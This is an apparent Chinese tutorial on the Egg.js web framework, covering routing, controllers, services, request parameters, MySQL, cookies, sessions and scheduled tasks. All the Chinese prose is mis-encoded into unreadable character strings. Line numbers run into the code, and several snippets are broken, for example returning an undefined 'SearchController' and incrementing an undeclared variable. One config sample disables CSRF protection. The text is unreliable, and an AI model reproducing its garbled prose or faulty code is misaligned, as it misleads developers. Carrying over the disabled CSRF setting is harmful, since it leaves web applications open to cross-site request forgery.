//ä¸€èˆ¬æ€§æ¥è¯´é»˜è®¤ç«¯å£æ˜¯7001 2 ç›®å½•ç»“æ„ä»‹ç»2.1 ç›®å½•ç»“æ„1234567891011121314151617181920212223242526272829303132333435363738egg-projectâ”œâ”€â”€ package.jsonâ”œâ”€â”€ app.js (å¯é€‰)â”œâ”€â”€ agent.js (å¯é€‰)â”œâ”€â”€ app(é¡¹ç›®å¼€å‘ç›®å½•)| â”œâ”€â”€ router.js (ç”¨äºé…ç½® URL è·¯ç”±è§„åˆ™)â”‚ â”œâ”€â”€ controller (ç”¨äºè§£æç”¨æˆ·çš„è¾“å…¥ï¼Œå¤„ç†åè¿”å›ç›¸åº”çš„ç»“æœ)â”‚ | â””â”€â”€ home.jsâ”‚ â”œâ”€â”€ service (ç”¨äºç¼–å†™ä¸šåŠ¡é€»è¾‘å±‚)â”‚ | â””â”€â”€ user.jsâ”‚ â”œâ”€â”€ middleware (ç”¨äºç¼–å†™ä¸­é—´ä»¶)â”‚ | â””â”€â”€ response_time.jsâ”‚ â”œâ”€â”€ schedule (å¯é€‰)â”‚ | â””â”€â”€ my_task.jsâ”‚ â”œâ”€â”€ public (ç”¨äºæ”¾ç½®é™æ€èµ„æº)â”‚ | â””â”€â”€ reset.cssâ”‚ â”œâ”€â”€ view (å¯é€‰)â”‚ | â””â”€â”€ home.tplâ”‚ â””â”€â”€ extend (ç”¨äºæ¡†æ¶çš„æ‰©å±•)â”‚ â”œâ”€â”€ helper.js (å¯é€‰)â”‚ â”œâ”€â”€ request.js (å¯é€‰)â”‚ â”œâ”€â”€ response.js (å¯é€‰)â”‚ â”œâ”€â”€ context.js (å¯é€‰)â”‚ â”œâ”€â”€ application.js (å¯é€‰)â”‚ â””â”€â”€ agent.js (å¯é€‰)â”œâ”€â”€ config (ç”¨äºç¼–å†™é…ç½®æ–‡ä»¶)| â”œâ”€â”€ plugin.js(ç”¨äºé…ç½®éœ€è¦åŠ è½½çš„æ’ä»¶)| â”œâ”€â”€ config.default.jsâ”‚ â”œâ”€â”€ config.prod.js| â”œâ”€â”€ config.test.js (å¯é€‰)| â”œâ”€â”€ config.local.js (å¯é€‰)| â””â”€â”€ config.unittest.js (å¯é€‰)â””â”€â”€ test (ç”¨äºå•å…ƒæµ‹è¯•) â”œâ”€â”€ middleware | â””â”€â”€ response_time.test.js â””â”€â”€ controller â””â”€â”€ home.test.jså¤åˆ¶ä»£ç  3 è®¿é—®è·¯ç”±eggåœ¨è®¾è®¡å®Œå…¨ç¬¦åˆæ¯”è¾ƒå¥½çš„mvcçš„è®¾è®¡æ¨¡å¼ã€‚ 3.1 é‚£ä¹ˆä»€ä¹ˆæ˜¯mvcå‘¢? å…¨åæ˜¯Model View Controllerï¼Œæ˜¯æ¨¡å‹(model)ï¼è§†å›¾(view)ï¼æ§åˆ¶å™¨(controller)çš„ç¼©å†™ï¼Œä¸€ç§è½¯ä»¶è®¾è®¡å…¸èŒƒã€‚ åœ¨eggä¸­è§†å›¾ (view)ã€æ§åˆ¶å™¨ï¼ˆcontrollerï¼‰ å’Œæ•°æ®æ¨¡å‹ Modelï¼ˆServiceï¼‰ å’Œé…ç½®æ–‡ä»¶ï¼ˆconfigï¼‰ 3.2 æ§åˆ¶å™¨ï¼ˆcontrollerï¼‰ app/controller ç›®å½•ä¸‹é¢å®ç° Controller 123456789101112// app/controller/home.jsconst Controller = require(&apos;egg&apos;).Controller;class HomeController extends Controller &#123; async index() &#123; const &#123; ctx &#125; = this; ctx.body = &apos;hi, world&apos;; &#125;&#125;module.exports = HomeController; è¾“å…¥ npm run dev æŸ¥çœ‹ http://127.0.0.1:7001 è¾“å‡º hi, world æˆ‘è®¤ä¸ºæ§åˆ¶å™¨å°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œä»–ç®¡ç†è¾“å…¥å’Œè¾“å‡º *åŒæ ·ä½ å¯ä»¥åœ¨app/controller ç›®å½•ä¸‹ å†™å¾ˆå¤šä¸ªè¿™æ ·ä¸ªjsçš„ï¼Œæ¥ä»£è¡¨æ¥å£ 3.3 è·¯ç”±ï¼ˆRouterï¼‰ä¸»è¦ç”¨æ¥æè¿°è¯·æ±‚ URL å’Œå…·ä½“æ‰¿æ‹…æ‰§è¡ŒåŠ¨ä½œçš„ Controller çš„å¯¹åº”å…³ç³»ï¼Œ æ¡†æ¶çº¦å®šäº† app/router.js æ–‡ä»¶ç”¨äºç»Ÿä¸€æ‰€æœ‰è·¯ç”±è§„åˆ™ã€‚ ç°åœ¨å¾ˆå¤šå•é¡µé¢ï¼Œéƒ½æ˜¯å­˜åœ¨ç›¸å¯¹äºçš„è·¯ç”±ï¼Œä½ å†™ä¸ªjsï¼ŒåŒæ ·å°±è¦å†™ä¸€ä¸ªè·¯ç”± 123456789101112131415// app/controller/user.jsclass UserController extends Controller &#123; async info() &#123; const &#123; ctx &#125; = this; ctx.body = &#123; name: `hello $&#123;ctx.params.id&#125;`, &#125;; &#125;&#125;// app/router.jsmodule.exports = app =&gt; &#123; const &#123; router, controller &#125; = app; router.get(&apos;/user/:id&apos;, controller.user.info);&#125; 3.4 æ•°æ®æ¨¡å‹ Modelï¼ˆServiceï¼‰ç®€å•æ¥è¯´ï¼ŒService å°±æ˜¯åœ¨å¤æ‚ä¸šåŠ¡åœºæ™¯ä¸‹ç”¨äºåšä¸šåŠ¡é€»è¾‘å°è£…çš„ä¸€ä¸ªæŠ½è±¡å±‚ï¼Œæä¾›è¿™ä¸ªæŠ½è±¡æœ‰ä»¥ä¸‹å‡ ä¸ªå¥½å¤„ï¼š ä¿æŒ Controller ä¸­çš„é€»è¾‘æ›´åŠ ç®€æ´ã€‚ ä¿æŒä¸šåŠ¡é€»è¾‘çš„ç‹¬ç«‹æ€§ï¼ŒæŠ½è±¡å‡ºæ¥çš„ Service å¯ä»¥è¢«å¤šä¸ª Controller é‡å¤è°ƒç”¨ã€‚ å°†é€»è¾‘å’Œå±•ç°åˆ†ç¦»ï¼Œæ›´å®¹æ˜“ç¼–å†™æµ‹è¯•ç”¨ä¾‹ã€‚ 1234567891011121314151617181920// app/service/user.jsconst Service = require(&apos;egg&apos;).Service;class UserService extends Service &#123; async addName(name) &#123; const user = `ä½ å¥½,$&#123;name&#125;`; return user; &#125;&#125;module.exports = UserService;// app/controller/user.jsclass UserController extends Controller &#123; async info() &#123; const &#123; ctx &#125; = this; const userInfo = await ctx.service.user.addName(&apos;wjw&apos;); ctx.body = userInfo; &#125;&#125; 3.5 eggä¸­è§†å›¾ (view) eggä¸­çš„æ¨¡æ¿æ¸²æŸ“ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºå‰ç«¯åç«¯åˆ†ç¦»çš„è®¾è®¡ï¼Œæ›´åŠ æœ‰åˆ©äºä½œä¸ºæœåŠ¡å‹æ¶æ„è®¾è®¡ï¼Œæ‰€ä»¥è¿™è¾¹ä¸æè¿°viewçš„æ„é€  4 getã€postè¯·æ±‚4.1 get è¯·æ±‚4.1.1 queryåœ¨ URL ä¸­ ?åé¢çš„éƒ¨åˆ†æ˜¯ä¸€ä¸ª Query Stringï¼Œè¿™ä¸€éƒ¨åˆ†ç»å¸¸ç”¨äº GET ç±»å‹çš„è¯·æ±‚ä¸­ä¼ é€’å‚æ•°ã€‚ä¾‹å¦‚ GET /search?name=egg&amp;age=26ä¸­ name=egg&amp;age=26 å°±æ˜¯ç”¨æˆ·ä¼ é€’è¿‡æ¥çš„å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ context.query(ä¸ºä¸€ä¸ªå¯¹è±¡)æ‹¿åˆ°è§£æè¿‡åçš„è¿™ä¸ªå‚æ•°ä½“ 123456789101112module.exports = app =&gt; &#123;class HomeController extends Controller &#123; async getQuery() &#123; const queryObj = this.ctx.query; console.log(queryObj.age); console.log(queryObj); //æ‰“å°ç»“æœï¼š&#123; name: &apos;egg&apos;, age: &apos;26&apos; &#125; &#125; &#125; return SearchController;&#125;; å½“ Query String ä¸­çš„ key é‡å¤æ—¶ï¼Œcontext.queryåªå– key ç¬¬ä¸€æ¬¡å‡ºç°æ—¶çš„å€¼ï¼Œåé¢å†å‡ºç°çš„éƒ½ä¼šè¢«å¿½ç•¥ã€‚GET /posts?category=egg&amp;category=koa é€šè¿‡ context.queryæ‹¿åˆ°çš„å€¼æ˜¯ { category: &#39;egg&#39; }ã€‚ 4.1.2 queriesæœ‰æ—¶å€™æˆ‘ä»¬çš„ç³»ç»Ÿä¼šè®¾è®¡æˆè®©ç”¨æˆ·ä¼ é€’ç›¸åŒçš„ keyï¼Œä¾‹å¦‚ GET /posts?category=egg&amp;id=1&amp;id=2&amp;id=3ã€‚é’ˆå¯¹æ­¤ç±»æƒ…å†µï¼Œæ¡†æ¶æä¾›äº† context.queries å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿè§£æäº† Query Stringï¼Œä½†æ˜¯å®ƒä¸ä¼šä¸¢å¼ƒä»»ä½•ä¸€ä¸ªé‡å¤çš„æ•°æ®ï¼Œè€Œæ˜¯å°†ä»–ä»¬éƒ½æ”¾åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼š 12345678910111213// GET /posts?category=egg&amp;id=1&amp;id=2&amp;id=3const Controller = require(&apos;egg&apos;).Controller;class HomeController extends Controller &#123; async getQueries() &#123; console.log(this.ctx.queries); //result: // &#123; // category: [ &apos;egg&apos; ], // id: [ &apos;1&apos;, &apos;2&apos;, &apos;3&apos; ], // &#125; &#125;&#125;; context.queriesä¸Šæ‰€æœ‰çš„ key å¦‚æœæœ‰å€¼ï¼Œä¹Ÿä¸€å®šä¼šæ˜¯æ•°ç»„ç±»å‹ã€‚ 4.2 post è¯·æ±‚123456789101112// è·å–å‚æ•°æ–¹æ³• post è¯·æ±‚module.exports = app =&gt; &#123;class HomeController extends Controller &#123; async postObj() &#123; const queryObj = ctx.request.body; ctx.body = queryObj; &#125; &#125; return SearchController;&#125;; ä½†æ˜¯æˆ‘ä»¬è¯·æ±‚æœ‰æ—¶æ˜¯get,æœ‰æ—¶æ˜¯post,æœ‰æ—¶æœ¬æ¥åº”è¯¥æ˜¯postçš„è¯·æ±‚,ä½†æ˜¯ä¸ºäº†æµ‹è¯•æ–¹ä¾¿,è¿˜æ˜¯åšæˆgetå’Œpostè¯·æ±‚éƒ½æ”¯æŒçš„è¯·æ±‚,äºæ˜¯ä¸€ä¸ªèƒ½åŒæ—¶è·å–getå’Œpostè¯·æ±‚å‚æ•°çš„ä¸­é—´ä»¶å°±å¾ˆæœ‰å¿…è¦äº†. 4.3 ç¼–å†™ä¸­é—´å±‚è§£å†³getã€postè¯·æ±‚4.3.1 åœ¨appç›®å½•ä¸‹æ–°å»ºmiddlewareæ–‡ä»¶å¤¹4.3.2 åœ¨middlewareé‡Œé¢æ–°å»ºparams.js,å†…å®¹å¦‚ä¸‹12345678910111213/** * è·å–è¯·æ±‚å‚æ•°ä¸­é—´ä»¶ * å¯ä»¥ä½¿ç”¨ctx.paramsè·å–getæˆ–postè¯·æ±‚å‚æ•° */module.exports = options =&gt; &#123; return async function params(ctx, next) &#123; ctx.params = &#123; ...ctx.query, ...ctx.request.body &#125; await next(); &#125;;&#125;; æœ¬è´¨ä¸Šå°±æ˜¯æŠŠgetè¯·æ±‚çš„å‚æ•°å’Œpostè¯·æ±‚çš„å‚æ•°éƒ½æ”¾åˆ°paramsè¿™ä¸ªå¯¹è±¡é‡Œ,æ‰€ä»¥,ä¸ç®¡æ˜¯getè¿˜æ˜¯postéƒ½èƒ½è·å–åˆ°è¯·æ±‚å‚æ•° 4.3.3 åœ¨/config/config.default.jsé‡Œæ³¨å…¥ä¸­é—´ä»¶123456789&apos;use strict&apos;;module.exports = appInfo =&gt; &#123; const config = exports = &#123;&#125;;// æ³¨å…¥ä¸­é—´ä»¶ config.middleware = [ &apos;params&apos;, ]; return config;&#125;; 4.3.4 ä½¿ç”¨æ–‡ç« è·å–1234567891011121314151617181920212223/** * æ·»åŠ æ–‡ç« æ¥å£ */&apos;use strict&apos;;const Service = require(&apos;egg&apos;).Service;class ArticleService extends Service &#123; async add() &#123; const &#123; ctx &#125; = this; // è·å–è¯·æ±‚å‚æ•° const &#123; userId, title, content, &#125; = ctx.params; const result = await ctx.model.Article.create(&#123; userId, title, content, &#125;); return result; &#125;&#125;module.exports = ArticleService; 4.3.5 å…è®¸postè¯·æ±‚è·¨åŸŸ12345678910111213141516171819// config/plugin.jsexports.cors = &#123; enable: true, package: &apos;egg-cors&apos;,&#125;; // config/config.default.jsconfig.security = &#123; csrf: &#123; enable: false, ignoreJSON: true, &#125;, domainWhiteList: [ &apos;http://www.baidu.com&apos; ], // é…ç½®ç™½åå•&#125;;config.cors = &#123; // origin: &apos;*&apos;,//å…è®¸æ‰€æœ‰è·¨åŸŸè®¿é—®ï¼Œæ³¨é‡Šæ‰åˆ™å…è®¸ä¸Šé¢ ç™½åå• è®¿é—® allowMethods: &apos;GET,HEAD,PUT,POST,DELETE,PATCH&apos;,&#125;; *ä¸€èˆ¬æ€§æœ€å¥½ä½¿ç”¨ç™½åå•ï¼Œä¸è¦ä½¿ç”¨å…¨éƒ¨å…è®¸è·¨åŸŸï¼Œä¸å®‰å…¨ 5 mysqlæ•°æ®åº“æ¡†æ¶æä¾›äº† egg-mysql æ’ä»¶æ¥è®¿é—® MySQL æ•°æ®åº“ã€‚è¿™ä¸ªæ’ä»¶æ—¢å¯ä»¥è®¿é—®æ™®é€šçš„ MySQL æ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥è®¿é—®åŸºäº MySQL åè®®çš„åœ¨çº¿æ•°æ®åº“æœåŠ¡ã€‚ 5.1 å®‰è£…ä¸é…ç½®å®‰è£…å¯¹åº”çš„æ’ä»¶ egg-mysql : 1npm i --save egg-mysql å¼€å¯æ’ä»¶ï¼š 12345// config/plugin.jsexports.mysql = &#123; enable: true, package: &apos;egg-mysql&apos;,&#125;; åœ¨ config/config.${env}.js é…ç½®å„ä¸ªç¯å¢ƒçš„æ•°æ®åº“è¿æ¥ä¿¡æ¯ã€‚ 5.1.1 å•æ•°æ®æºå¦‚æœæˆ‘ä»¬çš„åº”ç”¨åªéœ€è¦è®¿é—®ä¸€ä¸ª MySQL æ•°æ®åº“å®ä¾‹ï¼Œå¯ä»¥å¦‚ä¸‹é…ç½®ï¼šä½¿ç”¨æ–¹å¼ï¼š 12345678910111213141516171819202122// config/config.$&#123;env&#125;.jsexports.mysql = &#123; // å•æ•°æ®åº“ä¿¡æ¯é…ç½® client: &#123; // host host: &apos;mysql.com&apos;, // ç«¯å£å· port: &apos;3306&apos;, // ç”¨æˆ·å user: &apos;test_user&apos;, // å¯†ç  password: &apos;test_password&apos;, // æ•°æ®åº“å database: &apos;test&apos;, &#125;, // æ˜¯å¦åŠ è½½åˆ° app ä¸Šï¼Œé»˜è®¤å¼€å¯ app: true, // æ˜¯å¦åŠ è½½åˆ° agent ä¸Šï¼Œé»˜è®¤å…³é—­ agent: false,&#125;;await app.mysql.query(sql, values); // å•å®ä¾‹å¯ä»¥ç›´æ¥é€šè¿‡ app.mysql è®¿é—® 5.1.2 å¤šæ•°æ®æºå¦‚æœæˆ‘ä»¬çš„åº”ç”¨éœ€è¦è®¿é—®å¤šä¸ª MySQL æ•°æ®æºï¼Œå¯ä»¥æŒ‰ç…§å¦‚ä¸‹é…ç½®ï¼š 12345678910111213141516171819202122232425262728293031323334353637exports.mysql = &#123; clients: &#123; // clientId, è·å–clientå®ä¾‹ï¼Œéœ€è¦é€šè¿‡ app.mysql.get(&apos;clientId&apos;) è·å– db1: &#123; // host host: &apos;mysql.com&apos;, // ç«¯å£å· port: &apos;3306&apos;, // ç”¨æˆ·å user: &apos;test_user&apos;, // å¯†ç  password: &apos;test_password&apos;, // æ•°æ®åº“å database: &apos;test&apos;, &#125;, db2: &#123; // host host: &apos;mysql2.com&apos;, // ç«¯å£å· port: &apos;3307&apos;, // ç”¨æˆ·å user: &apos;test_user&apos;, // å¯†ç  password: &apos;test_password&apos;, // æ•°æ®åº“å database: &apos;test&apos;, &#125;, // ... &#125;, // æ‰€æœ‰æ•°æ®åº“é…ç½®çš„é»˜è®¤å€¼ default: &#123; &#125;, // æ˜¯å¦åŠ è½½åˆ° app ä¸Šï¼Œé»˜è®¤å¼€å¯ app: true, // æ˜¯å¦åŠ è½½åˆ° agent ä¸Šï¼Œé»˜è®¤å…³é—­ agent: false,&#125;; 5.2 å°è£…å¢åˆ æ”¹æŸ¥5.2.1ã€æ’å…¥ï¼Œå‘usersè¡¨å†…æ’å…¥ä¸€æ¡æ•°æ®12345const result = await this.app.mysql.insert(&apos;users&apos;, &#123; name: &apos;wjw&apos;, age: 18 &#125;)// åˆ¤æ–­ï¼šresult.affectedRows === 1 5.2.2ã€æŸ¥è¯¢ï¼ŒæŸ¥è¯¢usersè¡¨name=Jackçš„æ•°æ®123456789101112const result = await this.app.mysql.select(&apos;users&apos;, &#123; columns: [&apos;id&apos;, &apos;name&apos;], //æŸ¥è¯¢å­—æ®µï¼Œå…¨éƒ¨æŸ¥è¯¢åˆ™ä¸å†™ï¼Œç›¸å½“äºæŸ¥è¯¢* where: &#123; name: &apos;wjw&apos; &#125;, //æŸ¥è¯¢æ¡ä»¶ orders: [ [&apos;id&apos;, &apos;desc&apos;] //é™åºdescï¼Œå‡åºasc ], limit: 10, //æŸ¥è¯¢æ¡æ•° offset: 0 //æ•°æ®åç§»é‡ï¼ˆåˆ†é¡µæŸ¥è¯¢ä½¿ç”¨ï¼‰ &#125;)//åˆ¤æ–­ï¼šresult.length &gt; 0 5.2.3ã€ä¿®æ”¹ï¼Œä¿®æ”¹usersè¡¨id=1çš„æ•°æ®ageä¸º2012345678const result = await this.app.mysql.update(&apos;users&apos;, &#123; age: 20 //éœ€è¦ä¿®æ”¹çš„æ•°æ® &#125;, &#123; where: &#123; id: 1 &#125; //ä¿®æ”¹æŸ¥è¯¢æ¡ä»¶ &#125;);//åˆ¤æ–­ï¼šresult.affectedRows === 1 5.2.4ã€åˆ é™¤ï¼Œåˆ é™¤usersè¡¨name=wjwçš„æ•°æ®123const result = await this.app.mysql.delete(&apos;users&apos;, &#123; name: &apos;wjw&apos;&#125;) 6 Cookie çš„ä½¿ç”¨6.1 Cookie ç®€ä»‹ cookie æ˜¯å­˜å‚¨äºè®¿é—®è€…çš„è®¡ç®—æœºä¸­çš„å˜é‡ã€‚å¯ä»¥è®©æˆ‘ä»¬ç”¨åŒä¸€ä¸ªæµè§ˆå™¨è®¿é—®åŒä¸€ä¸ªåŸŸåçš„æ—¶å€™å…±äº«æ•°æ®ã€‚ HTTP æ˜¯æ— çŠ¶æ€åè®®ã€‚ç®€å•åœ°è¯´ï¼Œå½“ä½ æµè§ˆäº†ä¸€ä¸ªé¡µé¢ï¼Œç„¶åè½¬åˆ°åŒä¸€ä¸ªç½‘ç«™çš„å¦ä¸€ä¸ªé¡µé¢ï¼ŒæœåŠ¡å™¨æ— æ³•è®¤è¯†åˆ°è¿™æ˜¯åŒä¸€ä¸ªæµè§ˆå™¨åœ¨è®¿é—®åŒä¸€ä¸ªç½‘ç«™ã€‚æ¯ä¸€æ¬¡çš„è®¿é—®ï¼Œéƒ½æ˜¯æ²¡æœ‰ä»»ä½•å…³ç³»çš„ã€‚ 6.2 Cookie çš„è®¾ç½®å’Œè·å–6.2.1 Cookie è®¾ç½®è¯­æ³• ctx.cookies.set(key, value, options) 1this.ctx.cookies.set(&apos;name&apos;,&apos;zhangsan&apos;); 6.2.2 Cookie è·å–è¯­æ³• ctx.cookies.get(key, options) 1this.ctx.cookies.get(&apos;name&apos;) 6.2.3 æ¸…é™¤ Cookie1this.ctx.cookies.set(&apos;name&apos;,null); æˆ–è€…è®¾ç½® maxAge è¿‡æœŸæ—¶é—´ä¸º 0 6.3 Cookie å‚æ•° options eggjs.org/en/core/cooâ€¦ 1234567ctx.cookies.set(key, value, &#123; maxAge:24 * 3600 * 1000, httpOnly: true, // é»˜è®¤æƒ…å†µä¸‹æ˜¯æ­£ç¡®çš„ encrypt: true, // cookieåœ¨ç½‘ç»œä¼ è¾“æœŸé—´åŠ å¯† ctx.cookies.get(&apos;frontend-cookie&apos;, &#123; encrypt: true&#125;); 6.4 è®¾ç½®ä¸­æ–‡ Cookie6.4.1 ç¬¬ä¸€ç§è§£å†³æ–¹æ¡ˆ123console.log(new Buffer(&apos;hello, world!&apos;).toString(&apos;base64&apos;));// è½¬æ¢æˆ base64å­—ç¬¦ä¸²ï¼šaGVsbG8sIHdvcmxkIQ==console.log(new Buffer(&apos;aGVsbG8sIHdvcmxkIQ==&apos;, &apos;base64&apos;).toString()); // è¿˜åŸ base64å­—ç¬¦ä¸²ï¼šhello, world! 6.4.2 ç¬¬äºŒç§è§£å†³æ–¹æ¡ˆ12345ctx.cookies.set(key, value, &#123; maxAge:24 * 3600 * 1000, httpOnly: true, // é»˜è®¤æƒ…å†µä¸‹æ˜¯æ­£ç¡®çš„ encrypt: true, // cookieåœ¨ç½‘ç»œä¼ è¾“æœŸé—´è¿›è¡ŒåŠ å¯†&#125;); 7 Sessionçš„ä½¿ç”¨7.1 Session ç®€å•ä»‹ç»session æ˜¯å¦ä¸€ç§è®°å½•å®¢æˆ·çŠ¶æ€çš„æœºåˆ¶ï¼Œä¸åŒçš„æ˜¯ Cookie ä¿å­˜åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸­ï¼Œè€Œsession ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚ 7.2 Session çš„å·¥ä½œæµç¨‹å½“æµè§ˆå™¨è®¿é—®æœåŠ¡å™¨å¹¶å‘é€ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯ä¼šåˆ›å»ºä¸€ä¸ª session å¯¹è±¡ï¼Œç”Ÿæˆä¸€ä¸ªç±»ä¼¼äº key,value çš„é”®å€¼å¯¹ï¼Œ ç„¶åå°† key(cookie)è¿”å›åˆ°æµè§ˆå™¨(å®¢æˆ·)ç«¯ï¼Œæµè§ˆå™¨ä¸‹æ¬¡å†è®¿é—®æ—¶ï¼Œæºå¸¦ key(cookie)ï¼Œæ‰¾åˆ°å¯¹åº”çš„ session(value)ã€‚ 7.3 Egg.js ä¸­ session çš„ä½¿ç”¨egg.js ä¸­ session åŸºäº egg-session å†…ç½®äº†å¯¹ session çš„æ“ä½œ 7.3.1 è®¾ç½®1234this.ctx.session.userinfo=&#123; name:&apos;å¼ ä¸‰&apos;, age:&apos;20&apos;&#125; 7.3.2 è·å–1var userinfo=this.ctx.session 7.3.3 Session çš„é»˜è®¤è®¾ç½®12345exports.session = &#123; key: &apos;EGG_SESS&apos;, maxAge: 24 * 3600 * 1000, // 1 day httpOnly: true, encrypt: true&#125;; 7.4 Session åœ¨ config.default.js ä¸­çš„é…ç½®12345config.session=&#123; key:&apos;SESSION_ID&apos;, maxAge:864000, renew: true //å»¶é•¿ä¼šè¯æœ‰æ•ˆæœŸ&#125; 7.5 cookie å’Œsession åŒºåˆ« cookie æ•°æ®å­˜æ”¾åœ¨å®¢æˆ·çš„æµè§ˆå™¨ä¸Šï¼Œsession æ•°æ®æ”¾åœ¨æœåŠ¡å™¨ä¸Šã€‚ cookie ç›¸æ¯” session æ²¡æœ‰ session å®‰å…¨ï¼Œåˆ«äººå¯ä»¥åˆ†æå­˜æ”¾åœ¨æœ¬åœ°çš„ COOKIE å¹¶è¿›è¡Œ COOKIEæ¬ºéª—ã€‚ session ä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚å½“è®¿é—®å¢å¤šï¼Œä¼šæ¯”è¾ƒå ç”¨ä½ æœåŠ¡å™¨çš„æ€§èƒ½è€ƒè™‘åˆ°å‡è½»æœåŠ¡å™¨æ€§èƒ½æ–¹é¢ï¼Œåº”å½“ä½¿ç”¨ COOKIEã€‚ å•ä¸ª cookie ä¿å­˜çš„æ•°æ®ä¸èƒ½è¶…è¿‡ 4Kï¼Œå¾ˆå¤šæµè§ˆå™¨éƒ½é™åˆ¶ä¸€ä¸ªç«™ç‚¹æœ€å¤šä¿å­˜ 20 ä¸ª cookieã€‚ 8 å®šæ—¶ä»»åŠ¡&amp;å®šç‚¹ä»»åŠ¡eggæä¾›äº†å¼ºå¤§çš„å®šæ—¶ä»»åŠ¡ç³»ç»Ÿã€‚é€šè¿‡å®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥ç³»ç»Ÿä¿®æ”¹æœåŠ¡çš„ç¼“å­˜æ•°æ®ï¼Œä»¥ä¾¿å¤„ç†éœ€è¦å®šæ—¶æ›´æ–°çš„æ•°æ®ã€‚ åœ¨app/scheduleç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªjsæ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªjsæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ ### 8.1 å®šæ—¶ä»»åŠ¡ 1234567891011121314151617// app/schedulemodule.exports = &#123; schedule: &#123; interval: &apos;1m&apos;, // 1 åˆ†é’Ÿé—´éš” type: &apos;all&apos;, // æŒ‡å®šæ‰€æœ‰çš„ worker éƒ½éœ€è¦æ‰§è¡Œ &#125;, async task(ctx) &#123; i++ console.log(i) &#125;,&#125;;/* æ³¨é‡Š: 1ms -&gt; 1æ¯«ç§’ 1s -&gt; 1ç§’ 1m -&gt; 1åˆ†é’Ÿ*/ 8.2 å®šç‚¹ä»»åŠ¡ å®šç‚¹ä»»åŠ¡ï¼ˆä»¥æ¯å‘¨ä¸€çš„5ç‚¹30åˆ†0ç§’æ›´æ–°æ’è¡Œæ¦œä¸ºä¾‹ï¼‰ 1ã€ä½¿ç”¨cronå‚æ•°è®¾å®šæ—¶é—´ï¼Œcronå‚æ•°åˆ†ä¸º6ä¸ªéƒ¨åˆ†ï¼Œ*è¡¨ç¤ºæ‰€æœ‰éƒ½æ»¡è¶³ 123456789101112131415161718192021* * * * * *â”¬ â”¬ â”¬ â”¬ â”¬ â”¬â”‚ â”‚ â”‚ â”‚ â”‚ |â”‚ â”‚ â”‚ â”‚ â”‚ â”” æ˜ŸæœŸ (0 - 7) (0æˆ–7éƒ½æ˜¯æ˜ŸæœŸæ—¥)â”‚ â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€ æœˆä»½ (1 - 12)â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ æ—¥æœŸ (1 - 31)â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ å°æ—¶ (0 - 23)â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ åˆ†é’Ÿ (0 - 59)â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ç§’ (0 - 59, optional)// app/schedulemodule.exports = &#123; schedule: &#123; cron: &apos;0 30 5 * * 1&apos;, //æ¯å‘¨ä¸€çš„5ç‚¹30åˆ†0ç§’æ›´æ–° type: &apos;all&apos;, // æŒ‡å®šæ‰€æœ‰çš„ worker éƒ½éœ€è¦æ‰§è¡Œ &#125;, async task(ctx) &#123; i++ console.log(i) &#125;,&#125;; 8.3 åªæ‰§è¡Œä¸€æ¬¡å®šæ—¶ä»»åŠ¡ è®¾ç½®immediateå‚æ•°ä¸ºtrueæ—¶ï¼Œè¯¥å®šæ—¶ä»»åŠ¡ä¼šåœ¨é¡¹ç›®å¯åŠ¨æ—¶ï¼Œç«‹å³æ‰§è¡Œä¸€æ¬¡å®šæ—¶ä»»åŠ¡ 1234567891011module.exports = &#123; schedule: &#123; interval: &apos;1m&apos;, // 1 åˆ†é’Ÿé—´éš” type: &apos;all&apos;, // æŒ‡å®šæ‰€æœ‰çš„ worker éƒ½éœ€è¦æ‰§è¡Œ immediate: true, //é¡¹ç›®å¯åŠ¨å°±æ‰§è¡Œä¸€æ¬¡å®šæ—¶ä»»åŠ¡ &#125;, async task(ctx) &#123; i++ console.log(i) &#125;,&#125;; 8.4 å…³é—­ä»»åŠ¡ é…ç½®disableå‚æ•°ä¸ºtrueæ—¶ï¼Œè¯¥å®šæ—¶ä»»åŠ¡å³å…³é—­ 8.5 æŒ‡å®šå®šæ—¶ä»»åŠ¡æ‰§è¡Œç¯å¢ƒenv1env: [&quot;dev&quot;, &quot;debug&quot;] //è¯¥å®šæ—¶ä»»åŠ¡åœ¨å¼€å‘ç¯å¢ƒå’Œdebugæ¨¡å¼ä¸‹æ‰æ‰§è¡Œ 9 éƒ¨ç½²9.1 éƒ¨ç½²æœåŠ¡å™¨ é¦–å…ˆå½“ç„¶æ˜¯åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²å¥½nodeæœåŠ¡,ç„¶åå®‰è£…å¥½ã€‚ æœåŠ¡å™¨éœ€è¦é¢„è£… Node.jsï¼Œæ¡†æ¶æ”¯æŒçš„ Node ç‰ˆæœ¬ä¸º &gt;= 8.0.0ã€‚æ¡†æ¶å†…ç½®äº† egg-cluster æ¥å¯åŠ¨ Master è¿›ç¨‹ï¼ŒMaster æœ‰è¶³å¤Ÿçš„ç¨³å®šæ€§ï¼Œä¸å†éœ€è¦ä½¿ç”¨ pm2 ç­‰è¿›ç¨‹å®ˆæŠ¤æ¨¡å—ã€‚åŒæ—¶ï¼Œæ¡†æ¶ä¹Ÿæä¾›äº† egg-scripts æ¥æ”¯æŒçº¿ä¸Šç¯å¢ƒçš„è¿è¡Œå’Œåœæ­¢ã€‚ 